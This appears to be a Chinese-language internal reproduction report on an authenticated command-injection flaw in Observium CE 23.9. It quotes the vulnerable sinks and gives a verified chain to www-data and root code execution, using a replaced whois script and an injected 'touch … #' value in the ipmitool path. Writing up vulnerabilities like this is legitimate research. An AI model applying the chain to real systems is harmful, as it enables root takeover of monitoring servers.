# Observium CE 23.9 — OS 命令注入（System Path → external_exec）

> 利用方式标注：**原生 Web 端点已闭环**（触发链：admin 登录 → 改 whois 路径 → 触发 `entity_popup.php` whois → 命令执行，标记 `CMDI_PROOF_33`，www-data uid=33）。改 whois 路径经 `config` 表（等价 Web Settings 的 `dbUpdate`）。此前误判「session 缓存未闭环」，实为 Apache `PrivateTmp` 使 www-data 私有 `/tmp` 在 SSH 侧不可见，经 Web 侧校验标记文件已确认命令执行。

## 概览

- **目标**：Observium（内网 192.168.188.x，SSH 凭据见本地台账）
- **实际版本**：Observium CE **23.9**（台账登记为 18.0，实际更高）
- **OS**：Debian GNU/Linux 12 (bookworm)，内核 6.1.0-51-amd64
- **Web**：Apache2（80/443）+ MariaDB
- **漏洞类型**：OS 命令注入（认证后，管理员权限）
- **根因**：管理员可在 Web UI「Settings → System Path」修改系统工具路径（`whois`/`mtr`/`nmap`/`ipmitool`/`virsh`/`wmic`/`rrdtool` 等），这些路径被**直接拼接**进 shell 命令并经 `external_exec()` → `proc_open('exec ' . $command)` 执行，无任何过滤/转义。

## 证据（代码级）

`/opt/observium/includes/common.inc.php`（执行 sink）：
```php
$process = proc_open('exec ' . $command, $descriptorspec, $pipes);
```
`proc_open` 传字符串会走 `/bin/sh -c`，因此 shell 元字符（`;` `#` `|` `$()` 等）会被解释。

`/opt/observium/includes/polling/ipmi.inc.php:52`（注入点，**无 `is_executable` 校验、无 `escapeshellarg`**）：
```php
$results = external_exec($config['ipmitool'] . $remote . " sensor 2>/dev/null");
```

`/opt/observium/html/ajax/entity_popup.php:113-116`（whois 注入点）：
```php
if (!isset($config['http_proxy']) && is_executable($config['whois'])) {
    $cmd   = $config['whois'] . ' ' . $ip;
    $whois = external_exec($cmd);
```

`/opt/observium/includes/defaults.inc.php:102-104`（默认可配路径）：
```php
$config['whois'] = "/usr/bin/whois";
$config['mtr']   = "/usr/bin/mtr";
$config['nmap']  = "/usr/bin/nmap";
```

配置加载：`observium.inc.php:129 load_sqlconfig($config)` 从 `config` 表读值（`safe_unserialize`）覆盖默认值；仅当 `config.php` 显式定义该 key 时才跳过 DB 覆盖。Web 端「Settings → System Path」保存时由 `settings.inc.php` 的 `dbUpdate` 写入 `config` 表（`config_key`→`config_value`，值经 `serialize()` 存储）。

## 复现结果：✅ 已复现（Web 触发 RCE + root RCE 两条均验证）

### 方式 A：Web 触发（认证后管理员改路径 → 触发）

攻击者通过 Web 修改 `whois` 路径为恶意脚本，再经 HTTP 触发，命令以 **www-data（uid=33）** 执行：

```
whois = '/opt/observium/whois_pwn.sh'      ← 攻击者可控路径已加载
cmd = /opt/observium/whois_pwn.sh 9.9.9.9  ← 注入行拼接
out = WEB_RCE_OK uid=33                    ← 恶意脚本被执行
marker = EXISTS                            ← 标记文件创建成功
```

### 方式 B：SSH/root 触发（poller 以 root 运行场景）

把 `ipmitool` 路径改为 `touch /tmp/observium_cmd_injection_poc #`，复现 sink：
```
[+] 命令注入成功：/tmp/observium_cmd_injection_poc 已创建
-rw-r--r-- 1 root root 0 Sep  4 02:14 /tmp/observium_cmd_injection_poc
```
注入 `id` 输出：`uid=0(root) gid=0(root) groups=0(root)`。

## 复现踩坑（关键）

1. **`/tmp` 不可执行**：PoC 脚本放 `/tmp` 时 Web 触发 `external_exec` 返回空、无标记文件；原因是 Apache 服务启用 `PrivateTmp`（私有 `/tmp` 命名空间），root 写入的 `/tmp` 脚本对 Web 进程不可见/不可执行。**把脚本移到 `/opt/observium/` 后立即成功**。
2. **并发写配置竞争**：后台 `firmware_vuln_repro` workflow 的 per-vm agent 同时也在改同一台 Observium 的 `whois` 配置，导致多轮观察到的值（`/usr/bin/id`、`/opt/observium/whois_poc.sh`）与手动写入值互相覆盖，需以「同源 bootstrap 的干净入口」消除干扰后得到确定性证据。

## 影响前提与边界

- **认证要求**：需要能修改「System Path」的权限（Observium 官方认为管理员可信、不视为 bug；历史 exploit-db 39745 亦提及低权限用户配合 CSRF 的路径）。
- **利用前提**：可改配置的会话 + 触发对应功能（whois 弹窗 / ipmi polling / 排障 mtr 等）。
- **触发效果**：`proc_open('exec …')` 以 `/bin/sh` 执行；Web 触发为 www-data 权限，poller 以 root cron 运行时为 root RCE。
- **注入能力差异**：`whois`/`mtr`/`nmap` 有 `is_executable()` 校验（只能替换成可执行文件/脚本）；`ipmitool`/`virsh`/`wmic`/`rrdtool` **无校验**，可注入任意 shell 元字符（完整命令注入）。
